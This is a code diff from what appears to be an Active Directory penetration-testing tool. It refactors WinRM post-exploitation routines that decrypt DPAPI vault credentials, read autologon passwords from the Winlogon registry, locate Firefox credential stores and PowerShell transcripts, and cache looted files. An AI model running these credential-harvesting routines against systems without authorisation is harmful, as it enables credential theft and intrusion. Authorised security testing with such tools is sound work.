+            print_dpapi_no_masterkeys_notice(
+                auth_user=marked_user,
+                host=marked_host,
+            )
+            return
+        if dump_result.decrypted_masterkey_count == 0:
+            print_warning(
+                "Found masterkeys but could not decrypt any (wrong password "
+                "or all keys require the domain backup key)."
+            )
+            return
+        if not dump_result.normalized_credentials:
+            print_dpapi_no_vault_card(
+                auth_user=marked_user,
+                auth_domain=domain,
+                host=marked_host,
+                masterkeys_decrypted=dump_result.decrypted_masterkey_count,
+                masterkeys_seen=dump_result.discovered_masterkey_count,
+            )
+            return
+
+        domains_data = getattr(shell, "domains_data", {}) or {}
+        domain_data = (
+            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
+        )
+        pdc_ip = str(domain_data.get("pdc") or "").strip()
+        ad_users = _load_dpapi_ad_users(shell, domain)
+        enriched = _run_native_async(
+            process_dpapi_credentials(
+                dump_result.normalized_credentials,
+                domain=domain,
+                pdc_ip=pdc_ip,
+                domains_data=domains_data if isinstance(domains_data, dict) else {},
+                ad_users=ad_users,
+                skip_verification=not bool(pdc_ip),
+            )
+        )
+        actionable = tuple(ev for ev in enriched if ev.kind != "noise")
+        if not pdc_ip:
+            print_info_verbose(
+                "[winrm-dpapi] PDC IP not configured; recovered values were "
+                "classified but domain verification/persistence was skipped."
+            )
+
+        if not actionable:
+            print_dpapi_no_vault_card(
+                auth_user=marked_user,
+                auth_domain=domain,
+                host=marked_host,
+                masterkeys_decrypted=dump_result.decrypted_masterkey_count,
+                masterkeys_seen=dump_result.discovered_masterkey_count,
+            )
+            return
+
+        haul_entries = tuple(
+            DpapiHaulEntry(
+                kind=classify_credential_kind(ev.raw.target),
+                target=ev.raw.target or "—",
+                identity=mark_sensitive(ev.raw.username, "user"),
+                password=mark_sensitive(ev.raw.password, "password"),
+            )
+            for ev in actionable
+        )
+        print_dpapi_haul_card(
+            auth_user=marked_user,
+            auth_domain=domain,
+            host=marked_host,
+            entries=haul_entries,
+            masterkeys_decrypted=dump_result.decrypted_masterkey_count,
+            masterkeys_seen=dump_result.discovered_masterkey_count,
+        )
+
+        common_result = DpapiDumpResult(
+            mode="user",
+            success=dump_result.success,
+            target_host=host,
+            pdc=pdc_ip,
+            decrypted_masterkeys={
+                f"winrm-user-{idx}": b""
+                for idx in range(dump_result.decrypted_masterkey_count)
+            },
+            locked_masterkeys={
+                f"winrm-locked-{idx}": "locked"
+                for idx in range(
+                    max(
+                        dump_result.discovered_masterkey_count
+                        - dump_result.decrypted_masterkey_count,
+                        0,
+                    )
+                )
+            },
+            credentials=dump_result.normalized_credentials,
+            errors=tuple(dump_result.diagnostics),
+        )
+        _persist_dpapi_result(
+            shell,
+            common_result,
+            domain=domain,
+            host=host,
+            enriched=enriched,
+            source_protocol="winrm",
+        )
+        persisted = sum(1 for ev in enriched if ev.verify_status == "verified")
+        if persisted == 0:
+            print_info_verbose(
+                "No recovered DPAPI credential was domain-verified for persistence."
+            )
+        else:
+            print_info_verbose(
+                f"Persisted {persisted} new credential"
+                f"{'s' if persisted != 1 else ''} into the workspace."
+            )
 
     except Exception as exc:  # pragma: no cover - defensive
         telemetry.capture_exception(exc)
@@ -1245,7 +1589,7 @@ def check_autologon(
         )
 
         autologon_script = (
-            '$props = Get-ItemProperty '
+            "$props = Get-ItemProperty "
             '"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" | '
             "Select-Object DefaultDomainName,DefaultUserName,DefaultPassword; "
             "$props | ConvertTo-Json -Compress"
@@ -1264,20 +1608,14 @@ def check_autologon(
             default_user_name = str(data.get("DefaultUserName") or "").strip()
             default_password = str(data.get("DefaultPassword") or "").strip()
             default_domain_name = str(data.get("DefaultDomainName") or "").strip()
-        except (WinRMPSRPError, json.JSONDecodeError) as exc:
-            print_info_debug(
-                "WinRM PSRP autologon retrieval failed; falling back to "
-                f"NetExec: {exc}"
+        except WinRMPSRPError as exc:
+            print_error(f"WinRM PSRP autologon retrieval failed: {exc}")
+            return
+        except json.JSONDecodeError as exc:
+            print_error(
+                f"WinRM PSRP autologon registry query returned non-JSON output: {exc}"
             )
-            default_user_name, default_password, default_domain_name = (
-                _check_autologon_legacy_netexec(
-                    shell,
-                    domain=domain,
-                    host=host,
-                    username=username,
-                    password=password,
-                )
-            )
+            return
 
         if default_user_name and default_password:
             if "\\" in default_user_name:
@@ -1292,7 +1630,7 @@ def check_autologon(
             shell.console.print(f"   User: {user_autologon}")
             shell.console.print(f"   Password: {default_password}")
 
-            shell.add_credential(domain, user_autologon, default_password)
+            shell.add_credential(domain, user_autologon, default_password, credential_origin="winrm_creds")
         else:
             print_error("No autologon credentials found in the output.")
 
@@ -1300,57 +1638,6 @@ def check_autologon(
         telemetry.capture_exception(exc)
         print_error("Error accessing autologon credentials.")
         print_exception(show_locals=False, exception=exc)
-
-
-def _check_autologon_legacy_netexec(
-    shell: Any, *, domain: str, host: str, username: str, password: str
-) -> tuple[str, str, str]:
-    """Fallback autologon retrieval using NetExec WinRM."""
-    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
-
-    autologon_command = (
-        f"""{shell.netexec_path} winrm {host} {auth} --log domains/{domain}/winrm/dump_{host}_autologon.txt """
-        f"""-X 'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" | """
-        f"""Select DefaultDomainName,DefaultUserName,DefaultPassword | fl'"""
-    )
-    print_info_debug(f"Command: {autologon_command}")
-    completed_process = shell._run_netexec(  # type: ignore[attr-defined]
-        autologon_command,
-        domain=domain,
-        timeout=300,
-        operation_kind="winrm_autologon_fallback",
-        service="winrm",
-        target_count=1,
-    )
-    output = completed_process.stdout or ""
-    errors_output = completed_process.stderr or ""
-
-    if completed_process.returncode != 0:
-        error_message = errors_output.strip() if errors_output else output.strip()
-        raise WinRMPSRPError(
-            "Error obtaining autologon credentials: "
-            f"{error_message if error_message else 'Details not available'}"
-        )
-
-    default_user_name = ""
-    default_password = ""
-    default_domain_name = ""
-
-    for line in output.splitlines():
-        if "DefaultUserName" in line:
-            parts = line.split(":", 1)
-            if len(parts) > 1:
-                default_user_name = parts[1].strip()
-        elif "DefaultPassword" in line:
-            parts = line.split(":", 1)
-            if len(parts) > 1:
-                default_password = parts[1].strip()
-        elif "DefaultDomainName" in line:
-            parts = line.split(":", 1)
-            if len(parts) > 1:
-                default_domain_name = parts[1].strip()
-
-    return default_user_name, default_password, default_domain_name
 
 
 def show_powershell_history(
@@ -1398,14 +1685,10 @@ def show_powershell_history(
             with open(
                 history_local_path, "r", encoding="utf-8", errors="ignore"
             ) as handle:
-                history_lines = [
-                    line.rstrip("\r\n") for line in handle if line.strip()
-                ]
+                history_lines = [line.rstrip("\r\n") for line in handle if line.strip()]
         except OSError as file_err:
             telemetry.capture_exception(file_err)
-            print_error(
-                f"Error reading downloaded PowerShell history file: {file_err}"
-            )
+            print_error(f"Error reading downloaded PowerShell history file: {file_err}")
             return
 
         if not history_lines:
@@ -1590,17 +1873,8 @@ def check_powershell_transcripts(
             )
             transcript_paths = _parse_psrp_path_list(search_output)
         except (WinRMPSRPError, json.JSONDecodeError) as exc:
-            print_info_debug(
-                "WinRM PSRP transcript search failed; falling back to NetExec: "
-                f"{exc}"
-            )
-            transcript_paths = _search_powershell_transcripts_legacy_netexec(
-                shell,
-                domain=domain,
-                host=host,
-                username=username,
-                password=password,
-            )
+            print_error(f"WinRM PSRP transcript search failed: {exc}")
+            return
 
         if not transcript_paths:
             marked_host = mark_sensitive(host, "hostname")
@@ -1734,61 +2008,6 @@ def check_powershell_transcripts(
         )
 
 
-def _search_powershell_transcripts_legacy_netexec(
-    shell: Any, *, domain: str, host: str, username: str, password: str
-) -> list[str]:
-    """Fallback transcript discovery via NetExec ``-X``."""
-    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
-    transcript_search_log = os.path.join(
-        "domains", domain, "winrm", f"{host}_pstranscripts_search.log"
-    )
-    search_script = (
-        '$ErrorActionPreference="SilentlyContinue";'
-        "$candidatePaths=@("
-        '"C:\\\\PSTranscripts",'
-        '"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcripts",'
-        '"C\\\\ProgramData\\\\PowerShell\\\\Transcripts",'
-        '"C:\\\\Users\\\\*\\\\Documents\\\\PowerShell\\\\Transcripts",'
-        '"C:\\\\Users\\\\*\\\\Documents\\\\WindowsPowerShell\\\\Transcripts",'
-        '"C:\\\\Users\\\\*\\\\Documents"'
-        ");"
-        "$paths=@();"
-        "foreach($p in $candidatePaths){ if(Test-Path $p){ $paths+=$p } };"
-        "$rootMatches=@();"
-        'try { $rootMatches = Get-ChildItem -Path "C:\\" -Directory -Force -Filter "pstrans*" '
-        "-ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName } catch { };"
-        "if($rootMatches.Count -gt 0){ $paths += $rootMatches };"
-        "if($paths.Count -eq 0){ exit 0 };"
-        'Get-ChildItem -Path $paths -Filter "PowerShell_transcript*" '
-        "-Recurse -Force -ErrorAction SilentlyContinue | "
-        "ForEach-Object { $_.FullName }"
-    )
-    search_command = (
-        f"""{shell.netexec_path} winrm {host} {auth} """
-        f"""--log {transcript_search_log} -X '{search_script}'"""
-    )
-    print_info_debug(f"Command: {search_command}")
-    search_proc = shell.run_command(search_command, timeout=300)
-    search_output = strip_ansi_codes(search_proc.stdout or "")
-
-    if search_proc.returncode != 0:
-        error_message = strip_ansi_codes(
-            (search_proc.stderr or search_output or "").strip()
-        )
-        marked_host = mark_sensitive(host, "hostname")
-        raise WinRMPSRPError(
-            f"Error searching for PowerShell transcripts on host {marked_host}: "
-            f"{error_message or 'Details not available'}"
-        )
-
-    transcript_paths: list[str] = []
-    for line in search_output.splitlines():
-        match = re.search(r"[A-Za-z]:\\[^\r\n]+", line)
-        if match:
-            transcript_paths.append(match.group(0).strip())
-    return transcript_paths
-
-
 def winrm_download(
     shell: Any,
     *,
@@ -1823,87 +2042,18 @@ def winrm_download(
         )
         try:
             downloaded_files = service.fetch_files(paths, download_dir)
-            for file_path in downloaded_files:
-                marked_path = mark_sensitive(file_path, "path")
-                print_success(f"File saved in {marked_path}")
-            return downloaded_files
         except WinRMPSRPError as exc:
-            print_info_debug(
-                f"WinRM PSRP download failed; falling back to NetExec: {exc}"
-            )
-            return _winrm_download_legacy_netexec(
-                shell,
-                domain=domain,
-                host=host,
-                username=username,
-                password=password,
-                paths=paths,
-                download_dir=download_dir,
-            )
+            print_error(f"WinRM PSRP download failed: {exc}")
+            return []
+        for file_path in downloaded_files:
+            marked_path = mark_sensitive(file_path, "path")
+            print_success(f"File saved in {marked_path}")
+        return downloaded_files
     except Exception as exc:
         telemetry.capture_exception(exc)
         print_error("Error downloading files.")
         print_exception(show_locals=False, exception=exc)
         return []
-
-
-def _winrm_download_legacy_netexec(
-    shell: Any,
-    *,
-    domain: str,
-    host: str,
-    username: str,
-    password: str,
-    paths: Iterable[str],
-    download_dir: str,
-) -> list[str]:
-    """Fallback file download via NetExec ``-X`` and base64 transfer."""
-    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
-    downloaded_files: list[str] = []
-
-    for path in paths:
-        file_name = path.split("\\")[-1]
-        save_path = os.path.join(download_dir, file_name)
-
-        download_command = (
-            f"{shell.netexec_path} winrm {host} {auth} "
-            f"--log {download_dir}/download_{file_name}.log "
-            f'-X \'$content = Get-Content "{path}" -Raw -Encoding Byte; '
-            "[Convert]::ToBase64String($content)'"
-        )
-
-        print_info_verbose(f"Downloading {file_name}")
-        print_info_debug(f"via: {download_command}")
-        proc = shell.run_command(download_command, timeout=300)
-
-        if proc.returncode != 0:
-            details = proc.stderr.strip() if proc.stderr else "Details not available"
-            print_error(f"Error downloading {file_name}: {details}")
-            continue
-
-        try:
-            base64_match = re.search(r"([A-Za-z0-9+/]{40,}={0,2})", proc.stdout)
-            if not base64_match:
-                print_warning_verbose(
-                    f"No valid base64 content found for {file_name}"
-                )
-                continue
-
-            cleaned_output = base64_match.group(1)
-            while len(cleaned_output) % 4 != 0:
-                cleaned_output += "="
-
-            file_content = base64.b64decode(cleaned_output)
-            with open(save_path, "wb") as handle:
-                handle.write(file_content)
-            print_success(f"File {file_name} saved in {download_dir}")
-            downloaded_files.append(save_path)
-        except Exception as exc:
-            telemetry.capture_exception(exc)
-            print_error(f"Error saving {file_name}.")
-            print_exception(show_locals=False, exception=exc)
-
-    return downloaded_files
 
 
 def winrm_upload(
@@ -1914,6 +2064,7 @@ def winrm_upload(
     password: str,
     local_path: str,
     remote_path: str,
+    kerberos_spn_host: str | None = None,
 ) -> bool:
     """Upload a local file to a remote host over WinRM using pypsrp.
 
@@ -1930,6 +2081,7 @@ def winrm_upload(
             host=host,
             username=username,
             password=password,
+            kerberos_spn_host=kerberos_spn_host,
         )
         result = service.upload_file(local_path, remote_path)
     except WinRMPSRPError as exc:
@@ -1940,9 +2092,7 @@ def winrm_upload(
         marked_remote = mark_sensitive(remote_path, "path")
         print_success(f"WinRM upload completed: {marked_remote}")
         return True
-    print_warning(
-        "WinRM upload finished but remote verification metadata is missing."
-    )
+    print_warning("WinRM upload finished but remote verification metadata is missing.")
     return True
 
 
@@ -1997,25 +2147,14 @@ def check_firefox_credentials(
             )
             paths = _parse_psrp_path_list(output)
         except (WinRMPSRPError, json.JSONDecodeError) as exc:
-            print_info_debug(
-                "WinRM PSRP Firefox search failed; falling back to NetExec: "
-                f"{exc}"
-            )
-            paths = _check_firefox_credentials_legacy_netexec(
-                shell,
-                domain=domain,
-                host=host,
-                username=username,
-                password=password,
-            )
+            print_error(f"WinRM PSRP Firefox credential search failed: {exc}")
+            return
 
         if any(path.endswith("key4.db") for path in paths) and any(
             path.endswith("logins.json") for path in paths
         ):
             marked_username = mark_sensitive(username, "user")
-            print_warning(
-                f"Firefox credential files found for user {marked_username}"
-            )
+            print_warning(f"Firefox credential files found for user {marked_username}")
 
             if not paths:
                 print_error("No valid file paths found")
@@ -2037,45 +2176,12 @@ def check_firefox_credentials(
                 shell.extract_firefox_passwords(domain, host, download_dir)
         else:
             marked_username = mark_sensitive(username, "user")
-            print_error(
-                f"No Firefox credential files found for user {marked_username}"
-            )
+            print_error(f"No Firefox credential files found for user {marked_username}")
 
     except Exception as exc:  # pragma: no cover - defensive
         telemetry.capture_exception(exc)
         print_error("Error searching for Firefox credentials.")
         print_exception(show_locals=False, exception=exc)
-
-
-def _check_firefox_credentials_legacy_netexec(
-    shell: Any, *, domain: str, host: str, username: str, password: str
-) -> list[str]:
-    """Fallback Firefox credential file discovery via NetExec."""
-    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
-    firefox_command = (
-        f"""{shell.netexec_path} winrm {host} {auth} --log """
-        f"""domains/{domain}/winrm/{host}_firefox_{username}.log -X """
-        f"""'Get-ChildItem -Path "C:\\Users\\{username}\\AppData" """
-        f"""-Include key4.db,logins.json -File -Recurse -ErrorAction SilentlyContinue """
-        f"""| ForEach-Object {{ $_.FullName }}'"""
-    )
-    print_info_debug(f"Command: {firefox_command}")
-    completed_process = shell.run_command(firefox_command, timeout=300)
-    output = completed_process.stdout or ""
-
-    if completed_process.returncode != 0:
-        error_message = (completed_process.stderr or output or "").strip()
-        raise WinRMPSRPError(
-            "Error finding Firefox files: "
-            f"{error_message if error_message else 'Details not available'}"
-        )
-
-    paths: list[str] = []
-    for line in output.splitlines():
-        match = re.search(r"[A-Za-z]:\\[^\r\n]+", line)
-        if match:
-            paths.append(match.group(0).strip())
-    return paths
 
 
 def _is_ctf_domain_pwned(shell: Any, domain: str) -> bool:
@@ -2109,36 +2215,6 @@ def _should_skip_winrm_followup_for_ctf_pwned(
         f"action={mark_sensitive(action_label, 'text')}"
     )
     return True
-
-
-def _should_continue_with_deeper_winrm_sensitive_scan(
-    *,
-    shell: Any,
-    domain: str,
-    phase_result: dict[str, Any],
-) -> bool:
-    """Ask whether deeper deterministic WinRM analysis should continue."""
-    return WindowsSensitiveScanPolicyService().should_continue_with_deeper_scan(
-        shell=shell,
-        domain=domain,
-        phase_result=phase_result,
-        workflow_label="WinRM",
-        skip_for_pwned_ctf=_is_ctf_domain_pwned(shell, domain),
-    )
-
-
-def _should_continue_with_heavy_winrm_artifact_analysis(
-    *,
-    shell: Any,
-    domain: str,
-) -> bool:
-    """Ask whether the heaviest WinRM artifact phase should run."""
-    return WindowsSensitiveScanPolicyService().should_continue_with_heavy_artifacts(
-        shell=shell,
-        domain=domain,
-        workflow_label="WinRM",
-        skip_for_pwned_ctf=_is_ctf_domain_pwned(shell, domain),
-    )
 
 
 def _select_winrm_sensitive_data_method(shell: Any, *, ai_configured: bool) -> str:
@@ -2183,7 +2259,11 @@ def _get_winrm_mapping_cache_paths(
     root_strategy: str,
 ) -> tuple[str, str]:
     """Return absolute/relative cache manifest paths for one WinRM mapping context."""
-    from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_relpath, domain_subpath
+    from adscan_internal.workspaces import (
+        DEFAULT_DOMAIN_LAYOUT,
+        domain_relpath,
+        domain_subpath,
+    )
 
     cache_key = WinRMFileMappingService.build_cache_key(
         host=host,
@@ -2214,6 +2294,57 @@ def _get_winrm_mapping_cache_paths(
     return cache_abs, cache_rel
 
 
+def _get_winrm_loot_cache_base(
+    shell: Any,
+    *,
+    workspace_cwd: str,
+    domain: str,
+    host: str,
+    username: str,
+    root_strategy: str,
+) -> str:
+    """Return the base directory for per-phase loot caches for one WinRM context.
+
+    Structure: ``cache/{cache_key}/phases/``
+    Each phase then stores its loot under ``phases/{phase}/loot/``.
+    """
+    from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_subpath
+
+    cache_key = WinRMFileMappingService.build_cache_key(
+        host=host,
+        username=username,
+        root_strategy=root_strategy,
+    )
+    return domain_subpath(
+        workspace_cwd,
+        shell.domains_dir,
+        domain,
+        DEFAULT_DOMAIN_LAYOUT.winrm,
+        "sensitive",
+        "cache",
+        cache_key,
+        "phases",
+    )
+
+
+def _read_winrm_loot_cache_metadata(meta_path: str) -> dict[str, object] | None:
+    from adscan_internal.services.windows_loot_cache_service import read_loot_cache_metadata
+    return read_loot_cache_metadata(meta_path)
+
+
+def _write_winrm_loot_cache_metadata(
+    meta_path: str, *, file_count: int, host: str, username: str, phase: str
+) -> None:
+    from adscan_internal.services.windows_loot_cache_service import write_loot_cache_metadata
+    write_loot_cache_metadata(meta_path, file_count=file_count, host=host,
+                              username=username, phase=phase, transport="winrm")
+
+
+def _make_cached_loot_fetcher(loot_dir: str):  # type: ignore[return]
+    from adscan_internal.services.windows_loot_cache_service import make_cached_loot_fetcher
+    return make_cached_loot_fetcher(loot_dir)
+
+
 def _parse_iso8601_timestamp(value: str) -> datetime | None:
     """Parse one ISO 8601 timestamp and return a timezone-aware UTC datetime."""
     normalized = str(value or "").strip()
@@ -2238,10 +2369,14 @@ def _resolve_winrm_mapping_cache_age_seconds(generated_at: str) -> float | None:
 
 def _resolve_winrm_mapping_mode(shell: Any) -> str:
     """Resolve the WinRM mapping cache policy override for one workflow run."""
-    shell_override = str(getattr(shell, "winrm_mapping_cache_mode", "") or "").strip().lower()
+    shell_override = (
+        str(getattr(shell, "winrm_mapping_cache_mode", "") or "").strip().lower()
+    )
     if shell_override in _VALID_WINRM_MAPPING_MODES:
         return shell_override
-    env_override = str(os.environ.get("ADSCAN_WINRM_MAPPING_MODE", "") or "").strip().lower()
+    env_override = (
+        str(os.environ.get("ADSCAN_WINRM_MAPPING_MODE", "") or "").strip().lower()
+    )
     if env_override in _VALID_WINRM_MAPPING_MODES:
         return env_override
     return _WINRM_MAPPING_MODE_AUTO
@@ -2275,20 +2410,36 @@ def _run_winrm_sensitive_scan_phase(
     phase: str,
     entries: list[WinRMFileMapEntry],
     run_root_abs: str,
+    loot_cache_base: str | None = None,
 ) -> dict[str, Any]:
     """Run one deterministic WinRM sensitive-data phase from a mapped manifest."""
 
     phase_definition = get_sensitive_phase_definition(phase)
     phase_label = str(phase_definition.get("label", phase) or phase)
     phase_root_abs = os.path.join(run_root_abs, phase)
-    loot_dir = os.path.join(phase_root_abs, "loot")
+    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
+
+    # ── Loot cache resolution ─────────────────────────────────────────────────
+    # When a loot_cache_base is provided, store fetched files there instead of
+    # a per-run directory so subsequent runs can skip the remote download.
+    if loot_cache_base:
+        loot_dir = os.path.join(loot_cache_base, phase, "loot")
+        loot_meta_path = os.path.join(loot_cache_base, phase, "loot_meta.json")
+    else:
+        loot_dir = os.path.join(phase_root_abs, "loot")
+        loot_meta_path = None
+    # phase_root_abs must always exist for persist_fetch_report and analysis
+    # output — even when loot_dir points to a separate cache directory.
+    os.makedirs(phase_root_abs, exist_ok=True)
     os.makedirs(loot_dir, exist_ok=True)
 
     if phase in {
         SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
         SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
     }:
-        phase_extensions = get_sensitive_file_extensions(str(phase_definition.get("profile", "")))
+        phase_extensions = get_sensitive_file_extensions(
+            str(phase_definition.get("profile", ""))
+        )
         selected_entries = WinRMFileMappingService.select_entries_by_extensions(
             entries=entries,
             extensions=phase_extensions,
@@ -2313,21 +2464,30 @@ def _run_winrm_sensitive_scan_phase(
         f"{mark_sensitive(host, 'hostname')}."
     )
     if phase_excluded_total:
-        preview = ", ".join(mark_sensitive(path, "path") for path in phase_excluded_preview)
-        remaining = phase_excluded_total - min(phase_excluded_total, len(phase_excluded_preview))
+        preview = ", ".join(
+            mark_sensitive(path, "path") for path in phase_excluded_preview
+        )
+        remaining = phase_excluded_total - min(
+            phase_excluded_total, len(phase_excluded_preview)
+        )
         remaining_suffix = f", +{remaining} more" if remaining > 0 else ""
+        _phase_prefixes = list(get_winrm_phase_excluded_path_prefixes(phase))
+        _phase_fragments = list(get_winrm_phase_excluded_path_fragments(phase))
+        _phase_file_names = list(get_winrm_phase_excluded_file_names(phase))
         print_info_debug(
             "WinRM phase candidate exclusions applied: "
             f"phase={phase} label={mark_sensitive(phase_label, 'text')} "
             f"excluded={phase_excluded_total} "
             f"reasons={phase_exclusion_reason_counts} "
-            f"path_prefixes={[mark_sensitive(item, 'path') for item in get_winrm_phase_excluded_path_prefixes(phase)]} "
-            f"path_fragments={[mark_sensitive(item, 'path') for item in get_winrm_phase_excluded_path_fragments(phase)]} "
-            f"file_names={list(get_winrm_phase_excluded_file_names(phase))} "
+            f"path_prefixes({len(_phase_prefixes)})=[{', '.join(mark_sensitive(p, 'path') for p in _phase_prefixes[:4])}{'...' if len(_phase_prefixes) > 4 else ''}] "
+            f"path_fragments({len(_phase_fragments)})=[{', '.join(mark_sensitive(p, 'path') for p in _phase_fragments[:4])}{'...' if len(_phase_fragments) > 4 else ''}] "
+            f"file_names={_phase_file_names} "
             f"preview=[{rich_escape(preview)}{rich_escape(remaining_suffix)}]"
         )
     if not selected_entries:
-        print_info(f"No WinRM candidates matched phase {mark_sensitive(phase_label, 'text')}.")
+        print_info(
+            f"No WinRM candidates matched phase {mark_sensitive(phase_label, 'text')}."
+        )
         print_info_debug(
             "WinRM phase candidate selection returned no matches: "
             f"phase={phase} label={mark_sensitive(phase_label, 'text')} "
@@ -2346,33 +2506,68 @@ def _run_winrm_sensitive_scan_phase(
             "loot_dir": loot_dir,
         }
 
-    service = _build_winrm_psrp_service(
-        domain=domain,
-        host=host,
-        username=username,
-        password=password,
-    )
-    return WindowsSensitivePhaseExecutionService().execute_phase(
-        shell,
-        domain=domain,
-        host=host,
-        username=username,
-        phase=phase,
-        phase_label=phase_label,
-        phase_root_abs=phase_root_abs,
-        loot_dir=loot_dir,
-        selected_entries_count=len(selected_entries),
-        phase_excluded_total=phase_excluded_total,
-        fetcher=lambda: _fetch_winrm_phase_files(
-            service=service,
-            selected_entries=selected_entries,
+    # ── Loot cache check ─────────────────────────────────────────────────────
+    from adscan_internal.services.windows_loot_cache_service import decide_loot_cache_reuse
+
+    use_cached_loot = (
+        loot_meta_path is not None
+        and decide_loot_cache_reuse(
+            shell,
             loot_dir=loot_dir,
-            workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
-        ),
-        source_share="winrm",
-        source_artifact="winrm deterministic file scan",
-        transport_label="WinRM",
-    ).to_dict()
+            meta_path=loot_meta_path,
+            phase_label=phase_label,
+            workspace_type=workspace_type,
+            transport_label="WinRM",
+        )
+    )
+
+    if use_cached_loot:
+        fetcher = _make_cached_loot_fetcher(loot_dir)
+    else:
+        service = _build_winrm_psrp_service(
+            domain=domain,
+            host=host,
+            username=username,
+            password=password,
+        )
+
+        def fetcher():  # type: ignore[misc]
+            result = _fetch_winrm_phase_files(
+                service=service,
+                selected_entries=selected_entries,
+                loot_dir=loot_dir,
+                workspace_type=workspace_type or None,
+            )
+            if loot_meta_path:
+                _write_winrm_loot_cache_metadata(
+                    loot_meta_path,
+                    file_count=len(list(result.downloaded_files)),
+                    host=host,
+                    username=username,
+                    phase=phase,
+                )
+            return result
+
+    return (
+        WindowsSensitivePhaseExecutionService()
+        .execute_phase(
+            shell,
+            domain=domain,
+            host=host,
+            username=username,
+            phase=phase,
+            phase_label=phase_label,
+            phase_root_abs=phase_root_abs,
+            loot_dir=loot_dir,
+            selected_entries_count=len(selected_entries),
+            phase_excluded_total=phase_excluded_total,
+            fetcher=fetcher,
+            source_share="winrm",
+            source_artifact="winrm deterministic file scan",
+            transport_label="WinRM",
+        )
+        .to_dict()
+    )
 
 
 def _fetch_winrm_phase_files(
@@ -2478,54 +2673,74 @@ def _run_winrm_ai_sensitive_data_scan(
         _handle_prioritized_findings_actions,
         _render_file_credentials_table,
     )
-    return WindowsAISensitiveAnalysisService().execute(
-        shell,
-        domain=domain,
-        host=host,
-        username=username,
-        entries=entries,
-        run_root_abs=run_root_abs,
-        workflow_label="WinRM",
-        source_share="winrm",
-        artifact_transport_folder="winrm",
-        select_scope=lambda current_shell: WindowsSensitiveScanPolicyService().select_ai_triage_scope(
-            shell=current_shell
-        ),
-        should_inspect_prioritized_files=lambda current_shell: WindowsSensitiveScanPolicyService().should_inspect_ai_prioritized_files(
-            shell=current_shell,
+
+    return (
+        WindowsAISensitiveAnalysisService()
+        .execute(
+            shell,
+            domain=domain,
+            host=host,
+            username=username,
+            entries=entries,
+            run_root_abs=run_root_abs,
             workflow_label="WinRM",
-        ),
-        should_continue_after_findings=lambda current_shell, current_domain: _should_continue_after_winrm_ai_findings(
-            shell=current_shell,
-            domain=current_domain,
-        ),
-        skip_for_pwned_ctf=_is_ctf_domain_pwned,
-        fetch_selected_entries=lambda selected_entries, loot_dir: _fetch_winrm_phase_files(
-            service=_build_winrm_psrp_service(
-                domain=domain,
-                host=host,
-                username=username,
-                password=password,
+            source_share="winrm",
+            artifact_transport_folder="winrm",
+            select_scope=lambda current_shell: (
+                WindowsSensitiveScanPolicyService().select_ai_triage_scope(
+                    shell=current_shell
+                )
             ),
-            selected_entries=selected_entries,
-            loot_dir=loot_dir,
-            workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
-        ),
-        render_findings_table=lambda current_shell, candidate, findings, source_label: _render_file_credentials_table(
-            current_shell,
-            candidate=candidate,
-            findings=findings,
-            source_label=source_label,
-        ),
-        handle_findings_actions=_handle_prioritized_findings_actions,
-    ).to_dict()
+            should_inspect_prioritized_files=lambda current_shell: (
+                WindowsSensitiveScanPolicyService().should_inspect_ai_prioritized_files(
+                    shell=current_shell,
+                    workflow_label="WinRM",
+                )
+            ),
+            should_continue_after_findings=lambda current_shell, current_domain: (
+                _should_continue_after_winrm_ai_findings(
+                    shell=current_shell,
+                    domain=current_domain,
+                )
+            ),
+            skip_for_pwned_ctf=_is_ctf_domain_pwned,
+            fetch_selected_entries=lambda selected_entries, loot_dir: (
+                _fetch_winrm_phase_files(
+                    service=_build_winrm_psrp_service(
+                        domain=domain,
+                        host=host,
+                        username=username,
+                        password=password,
+                    ),
+                    selected_entries=selected_entries,
+                    loot_dir=loot_dir,
+                    workspace_type=str(getattr(shell, "type", "") or "").strip().lower()
+                    or None,
+                )
+            ),
+            render_findings_table=lambda current_shell, candidate, findings, source_label: (
+                _render_file_credentials_table(
+                    current_shell,
+                    candidate=candidate,
+                    findings=findings,
+                    source_label=source_label,
+                )
+            ),
+            handle_findings_actions=_handle_prioritized_findings_actions,
+        )
+        .to_dict()
+    )
 
 
 def run_winrm_sensitive_data_scan(
     shell: Any, *, domain: str, host: str, username: str, password: str
 ) -> dict[str, Any]:
     """Run deterministic sensitive-data analysis over WinRM using PSRP mapping."""
-    from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_relpath, domain_subpath
+    from adscan_internal.workspaces import (
+        DEFAULT_DOMAIN_LAYOUT,
+        domain_relpath,
+        domain_subpath,
+    )
 
     if _should_skip_winrm_followup_for_ctf_pwned(
         shell=shell,
@@ -2541,7 +2756,9 @@ def run_winrm_sensitive_data_scan(
             "reason": "ctf_domain_pwned",
         }
 
-    from adscan_internal.services.ai_backend_availability_service import AIBackendAvailabilityService
+    from adscan_internal.services.ai_backend_availability_service import (
+        AIBackendAvailabilityService,
+    )
 
     availability = AIBackendAvailabilityService().get_availability()
     print_info_debug(
@@ -2549,7 +2766,9 @@ def run_winrm_sensitive_data_scan(
         f"configured={availability.configured} enabled={availability.enabled} "
         f"provider={availability.provider} reason={availability.reason}"
     )
-    method = _select_winrm_sensitive_data_method(shell, ai_configured=availability.configured)
+    method = _select_winrm_sensitive_data_method(
+        shell, ai_configured=availability.configured
+    )
     if method == "skip":
         print_info("WinRM sensitive-data analysis skipped by user.")
         return {"completed": False, "skipped": True}
@@ -2562,7 +2781,9 @@ def run_winrm_sensitive_data_scan(
